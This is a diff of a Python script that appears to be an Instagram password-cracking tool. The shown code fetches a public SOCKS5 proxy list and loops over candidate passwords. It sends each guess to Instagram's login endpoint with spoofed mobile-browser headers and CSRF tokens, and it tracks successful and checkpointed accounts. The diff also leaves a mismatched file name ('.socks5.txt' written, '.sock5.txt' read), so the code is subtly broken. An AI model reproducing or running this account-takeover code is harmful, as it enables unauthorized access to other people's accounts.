@@ -93,9 +93,9 @@ USN="Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TP1A.220624.014; wv) AppleWe
 
 try:
 	link = requests.get("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt").text
-	open(".socks5.txt","w").write(link)
+	open('.socks5.txt','w').write(link)
 except:pass
-prox=open("".sock5.txt","r").read().splitlines()
+prox=open('.sock5.txt','r').read().splitlines()
 
 internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],[]
 SORA={}
@@ -710,22 +710,22 @@ class instagram:
             except (json.decoder.JSONDecodeError,ValueError,KeyError):token = self.generated_csrf_token()
             for pw in pas:
                 headers = {
-                  "Host": "www.instagram.com",
-                  "x-ig-www-claim": "0",
-                  "x-requested-with": "XMLHttpRequest",
-                  "x-csrftoken": token,
-                  "x-ig-app-id": "1217981644879628",
-                  "sec-ch-ua-mobile": "?1",
-                  "x-instagram-ajax": "1016035497",
-                  "user-agent": ua,
-                  "content-type": "application/x-www-form-urlencoded",
-                  "accept": "*/*",
-                  "x-asbd-id": "129477",
-                  "origin": "https://www.instagram.com",
-                  "sec-fetch-site": "same-origin",
-                  "sec-fetch-mode": "cors",
-                  "sec-fetch-dest": "empty",
-                  "referer": "https://www.instagram.com/oauth/oidc/v2?redirect_uri=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Floginpage%2Figoidc%2Fcallback%2Fidtoken%2F&app_id=532380490911317&response_type=code&scope=openid&state=%7B%22user_nonce%22%3A%22ATA49RzWDRydRCyQ3omVT0YiRemKUAUyRQgHerrLPMultUtLeHXlGSYbood3CWfLlFa1csOHxnp_I3Ufeg28Cy3lvXYKcnHP1kcoP7rB%22%2C%22from_ig_login_upsell_sso%22%3Anull%2C%22login_source%22%3A%22fbs_web_landing_page%22%2C%22next%22%3A%22%5Cu00252F%5Cu00253Fnav_ref%5Cu00253Dbizweb_landing_ig_login_button%5Cu002526biz_login_source%5Cu00253Dbizweb_landing_login_ig_oidc_w_pc_login_button%22%2C%22require_professional%22%3Atrue%2C%22create_business_manager%22%3Atrue%7D&logger_id=4dd88fb7-0a40-4b28-9691-35a007c58d98",
+                  'Host': 'www.instagram.com',
+                  'x-ig-www-claim': '0',
+                  'x-requested-with': 'XMLHttpRequest',
+                  'x-csrftoken': token,
+                  'x-ig-app-id': '1217981644879628',
+                  'sec-ch-ua-mobile': '?1',
+                  'x-instagram-ajax': '1016035497',
+                  'user-agent': ua,
+                  'content-type': 'application/x-www-form-urlencoded',
+                  'accept': '*/*',
+                  'x-asbd-id': '129477',
+                  'origin': 'https://www.instagram.com',
+                  'sec-fetch-site': 'same-origin',
+                  'sec-fetch-mode': 'cors',
+                  'sec-fetch-dest': 'empty',
+                  'referer': 'https://www.instagram.com/oauth/oidc/v2?redirect_uri=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Floginpage%2Figoidc%2Fcallback%2Fidtoken%2F&app_id=532380490911317&response_type=code&scope=openid&state=%7B%22user_nonce%22%3A%22ATA49RzWDRydRCyQ3omVT0YiRemKUAUyRQgHerrLPMultUtLeHXlGSYbood3CWfLlFa1csOHxnp_I3Ufeg28Cy3lvXYKcnHP1kcoP7rB%22%2C%22from_ig_login_upsell_sso%22%3Anull%2C%22login_source%22%3A%22fbs_web_landing_page%22%2C%22next%22%3A%22%5Cu00252F%5Cu00253Fnav_ref%5Cu00253Dbizweb_landing_ig_login_button%5Cu002526biz_login_source%5Cu00253Dbizweb_landing_login_ig_oidc_w_pc_login_button%22%2C%22require_professional%22%3Atrue%2C%22create_business_manager%22%3Atrue%7D&logger_id=4dd88fb7-0a40-4b28-9691-35a007c58d98',
                     "accept-encoding": "gzip, deflate, br",
                     "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                 param={
